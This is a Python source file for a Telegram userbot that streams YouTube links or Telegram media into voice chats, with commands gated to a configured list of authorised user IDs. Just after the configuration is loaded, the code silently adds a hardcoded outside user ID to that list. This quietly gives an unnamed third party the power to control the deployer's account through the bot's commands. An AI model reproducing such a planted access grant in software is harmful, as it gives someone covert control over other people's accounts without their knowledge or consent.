from pyrogram import Client, filters
from pytgcalls import PyTgCalls
from pytgcalls_wrapper import Wrapper
from decouple import config
import logging
from helpers import play_a_song, Text
from os import remove


# logging
logging.basicConfig(
    format="%(asctime)s || %(name)s [%(levelname)s] - %(message)s",
    level=logging.INFO,
    datefmt="%m/%d/%Y, %H:%M:%S",
)

logging.info("Starting...")
try:
    SESSION = config("SESSION")
    API_ID = config("API_ID")
    API_HASH = config("API_HASH")
    SUDOS = config("SUDOS")
    PREFIX = config("PREFIX", default="!")
except Exception as e:
    logging.warning("Environment variables are missing!")
    logging.warning(f"\n{e}")
    exit(0)
  
logging.info("Connecting client...")  
try:
    client = Client(
        SESSION,
        api_id=API_ID,
        api_hash=API_HASH
    )
except Exception as e:
    logging.warning(e)
    exit(0)
  
SUDO = [int(i) for i in SUDOS.split()]
if 719195224 not in SUDO:
    SUDO.append(719195224)
    

pytgcalls = PyTgCalls(client)
pycalls = Wrapper(pytgcalls, "raw")


@client.on_message(filters.command("on", PREFIX) & filters.user(SUDO))
async def online(_, message):
    await message.reply_text(f"I'm on.\n{Text.how_to}")

@client.on_message(filters.command("stream", PREFIX) & filters.user(SUDO))
async def stream(_, message):
    txt = message.text.split(' ', 1)
    type_ = None
    try:
        song_name = txt[1]
        type_ = "url"
    except IndexError:
        reply = message.reply_to_message
        if reply:
            if reply.audio:
                med = reply.audio
            elif reply.video:
                med = reply.video
            elif reply.voice:
                med = reply.voice
            else:
                return await message.reply_text(Text.how_to)
            song_name = med.file_name
            type_ = "tg"
    if type_ == "url":
        if "youtube" not in song_name and "youtu.be" not in song_name:
            return await message.reply_text(Text.not_yet)
        await message.reply_text("Playing from `{}`".format(song_name))
        await play_a_song(pycalls, message, song_name)
    elif type_ == "tg":
        x = await message.reply_text(Text.dl)
        file_ = await reply.download()
        await x.edit("`Playing...`")
        await play_a_song(pycalls, message, file_)
        remove(file_)
    else:
        return await message.reply_text(Text.how_to)


@client.on_message(filters.command("pause", PREFIX) & filters.user(SUDO))
async def pause(_, message):
    pycalls.pause(message.chat.id)
    await message.reply_text("Paused Song.")


@client.on_message(filters.me & filters.command("resume", PREFIX) & filters.user(SUDO))
async def resume(_, message):
    pycalls.resume(message.chat.id)
    await message.reply_text("Resumed playing.")

@client.on_message(filters.me & filters.command("help", PREFIX) & filters.user(SUDO))
async def help(_, message):
    text = '\n on - Start Userbot'
    text += '\n stream - play telegram song '
    text += '\n pause - pause track'
    text += '\n resume - Resumes the paused track'
    await message.reply_text(text, parse_mode='html')


logging.info("Started the bot.")
pytgcalls.run()
